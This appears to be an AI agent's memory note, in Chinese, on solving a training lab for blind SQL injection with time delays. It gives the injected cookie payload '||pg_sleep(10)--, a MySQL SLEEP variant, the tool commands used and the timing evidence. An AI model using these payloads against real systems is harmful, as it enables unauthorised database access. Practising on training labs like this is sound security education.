---
metadata:
  node_type: memory
name: "PRS arm A lab-time-delays"
description: "arm A 基线:lab-time-delays(盲注时间延迟)一次通过 - TrackingId cookie 注 '||pg_sleep(10)-- 触发 10.8s 延迟,banner solved"
last_updated: 2026-10-09T06:03:41+08:00
created: 2026-10-09T06:03:41+08:00
---

# PRS arm A 基线:lab-time-delays(Blind SQL injection with time delays)

- 路径:`/web-security/sql-injection/blind/lab-time-delays`,实填可用;page_read 取 widget-lab-id `5D7C0F6A...AB0A7`。
- 实例:`range_launch launch-url <该路径> --jar /tmp/cj1.json`,reused:false,instance `https://0a4c008f041f504480d7fdf40087009b.web-security-academy.net/`。
- 题面:analytics 用的 TrackingId cookie 被拼进同步 SQL 查询;查询结果不回显、行数/报错也不改响应 ⇒ 唯一信道是条件时间延迟,要求造成 10 秒延迟。

## 解法(一次通过)

1. `http_session get <base> --jar /tmp/cj1.json`:拿基线 `TrackingId=MBZWLxK2eL6OVMIn`,首页 200。
2. `conn_reuse <base> --send-str 'GET / HTTP/1.1\r\nHost: ...\r\nCookie: TrackingId=<payload>\r\nConnection: close\r\n\r\n' --read-ms 20000`:
   - 基线 `TrackingId=MBZWLxK2eL6OVMIn` → `elapsed_ms=1085`(含 TLS 握手)。
   - `TrackingId='||pg_sleep(10)--` → `elapsed_ms=10828`,status 200,信封 `responses[0].elapsed_ms` 即延迟证据。
   - 库型判为 PostgreSQL(`'||pg_sleep(10)--` 命中),MySQL `' AND SLEEP(10)-- x` 腿未单独跑(首腿已达成求解条件)。
3. `banner_verdict <base> --jar /tmp/cj1.json` → `solved:true` / `congrats_line:"<h4>Congratulations, you solved the lab!</h4>"`。

## 两坑

- **conn_reuse 单连接复用在此 lab 不通**:一个 TCP 连接上串行发多条请求,服务端首响应即回 `Connection: close` 并关连接 → 信封只含 1 条 response,后续请求全部落空。时间信道必须**一条 payload 一次 run**(每次独立连接),用 `responses[0].elapsed_ms` 读时延;别把 baseline 与 payload 塞进同一次调用的多条 `--send-str`。
- 时延读数含 TLS 握手开销,基线本身 ~1.0s;判据看 payload 相对基线的 ~10s 增量(10828 vs 1085),而不是绝对 0。

